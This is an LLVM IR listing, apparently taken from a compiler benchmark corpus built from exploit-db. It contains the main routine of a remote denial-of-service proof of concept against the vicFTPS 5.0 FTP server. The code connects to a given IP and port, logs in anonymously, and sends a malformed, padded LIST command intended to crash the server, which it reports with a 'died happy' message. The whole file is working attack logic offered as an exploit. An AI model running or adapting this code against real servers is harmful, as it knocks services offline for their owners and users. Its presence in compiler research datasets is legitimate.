; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_6834.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_6834.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8, i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [379 x i8] c"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\0A+=========== vicFTPS v 5.0 REMOTE dos POC ;[      ===========+\0A+=========== Alfons Luja sp Z.0.0                 ===========+\0A+=========== I want clear b00f not a d0s !!!      ===========+\0A+=========== Propably 0 dAy                       ===========+\0A++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\0A\00", align 1
@.str.1 = private unnamed_addr constant [22 x i8] c"\0Ause poc.exe IP PORT\0A\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"USER Anonymous\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"PASS echo@gov.tr\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"LIST /\\/iWana_be_like_Gorion\\\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"\0ATarget:%s\0APort:%u\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"230 fake user logged in.\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"Send greeting!!\0A\00", align 1
@.str.9 = private unnamed_addr constant [36 x i8] c"Server is charmed and died happy!!\0A\00", align 1
@.str.10 = private unnamed_addr constant [49 x i8] c"Target dont love us . You must have account :[\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [79 x i8] c"(__eRROR):[Connection  error](!!!!)\0AIt can be bad port number or IP addresss!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.TYPE_4__, align 4
  %10 = alloca [666 x i8], align 16
  %11 = alloca [66 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([379 x i8], [379 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %17, label %19

17:                                               ; preds = %2
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %125

19:                                               ; preds = %2
  %20 = bitcast [666 x i8]* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 666, i1 false)
  %21 = bitcast [66 x i8]* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %21, i8 0, i64 66, i1 false)
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i8** %12, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i8** %13, align 8
  %22 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 0
  %23 = call i32 @strcpy(i8* %22, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %24 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 0
  %25 = call i32 @strlen(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = call i32 @memset(i8* %27, i32 66, i32 66)
  %29 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 64
  store i8 13, i8* %29, align 16
  %30 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 65
  store i8 10, i8* %30, align 1
  %31 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 66
  store i8 0, i8* %31, align 2
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @setport(i8* %37)
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i8* %34, i32 %38)
  %40 = call i32 @MAKEWORD(i32 4, i32 2)
  %41 = call i64 @WSAStartup(i32 %40, i32* %8)
  %42 = icmp eq i64 %41, 0
  br i1 %42, label %43, label %124

43:                                               ; preds = %19
  %44 = load i32, i32* @AF_INET, align 4
  %45 = load i32, i32* @SOCK_STREAM, align 4
  %46 = call i32 @socket(i32 %44, i32 %45, i32 0)
  store i32 %46, i32* %6, align 4
  %47 = icmp ne i32 %46, -1
  br i1 %47, label %48, label %122

48:                                               ; preds = %43
  %49 = load i32, i32* @AF_INET, align 4
  %50 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 3
  store i32 %49, i32* %50, align 4
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @inet_addr(i8* %53)
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 2
  %56 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @setport(i8* %59)
  %61 = call i32 @htons(i32 %60)
  %62 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 1
  store i32 %61, i32* %62, align 4
  %63 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 0
  %64 = call i32 @memset(i8* %63, i32 48, i32 8)
  %65 = load i32, i32* %6, align 4
  %66 = bitcast %struct.TYPE_4__* %9 to %struct.sockaddr*
  %67 = call i64 @connect(i32 %65, %struct.sockaddr* %66, i32 4)
  %68 = icmp eq i64 %67, 0
  br i1 %68, label %69, label %116

69:                                               ; preds = %48
  %70 = load i32, i32* %6, align 4
  %71 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %72 = call i32 @recv(i32 %70, i8* %71, i32 665, i32 0)
  %73 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %74 = call i32 @__z00ro(i8* %73)
  %75 = load i32, i32* %6, align 4
  %76 = load i8*, i8** %12, align 8
  %77 = load i8*, i8** %12, align 8
  %78 = call i32 @strlen(i8* %77)
  %79 = call i32 @send(i32 %75, i8* %76, i32 %78, i32 0)
  %80 = load i32, i32* %6, align 4
  %81 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %82 = call i32 @recv(i32 %80, i8* %81, i32 665, i32 0)
  %83 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %84 = call i32 @__z00ro(i8* %83)
  %85 = load i32, i32* %6, align 4
  %86 = load i8*, i8** %13, align 8
  %87 = load i8*, i8** %13, align 8
  %88 = call i32 @strlen(i8* %87)
  %89 = call i32 @send(i32 %85, i8* %86, i32 %88, i32 0)
  %90 = load i32, i32* %6, align 4
  %91 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %92 = call i32 @recv(i32 %90, i8* %91, i32 665, i32 0)
  %93 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %93)
  %95 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %96 = call i32 @strncmp(i8* %95, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i32 3)
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %110, label %98

98:                                               ; preds = %69
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %100 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %101 = call i32 @__z00ro(i8* %100)
  %102 = load i32, i32* %6, align 4
  %103 = getelementptr inbounds [66 x i8], [66 x i8]* %11, i64 0, i64 0
  %104 = call i32 @send(i32 %102, i8* %103, i32 66, i32 0)
  %105 = load i32, i32* %6, align 4
  %106 = getelementptr inbounds [666 x i8], [666 x i8]* %10, i64 0, i64 0
  %107 = call i32 @recv(i32 %105, i8* %106, i32 665, i32 0)
  %108 = call i32 @Sleep(i32 200)
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.9, i64 0, i64 0))
  br label %115

110:                                              ; preds = %69
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.10, i64 0, i64 0))
  %112 = load i32, i32* %6, align 4
  %113 = call i32 @closesocket(i32 %112)
  %114 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %125

115:                                              ; preds = %98
  br label %121

116:                                              ; preds = %48
  %117 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.11, i64 0, i64 0))
  %118 = load i32, i32* %6, align 4
  %119 = call i32 @closesocket(i32 %118)
  %120 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %125

121:                                              ; preds = %115
  br label %122

122:                                              ; preds = %121, %43
  %123 = call i32 (...) @WSACleanup()
  br label %124

124:                                              ; preds = %122, %19
  store i32 0, i32* %3, align 4
  br label %125

125:                                              ; preds = %124, %116, %110, %17
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @setport(i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @__z00ro(i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strncmp(i8*, i8*, i32) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
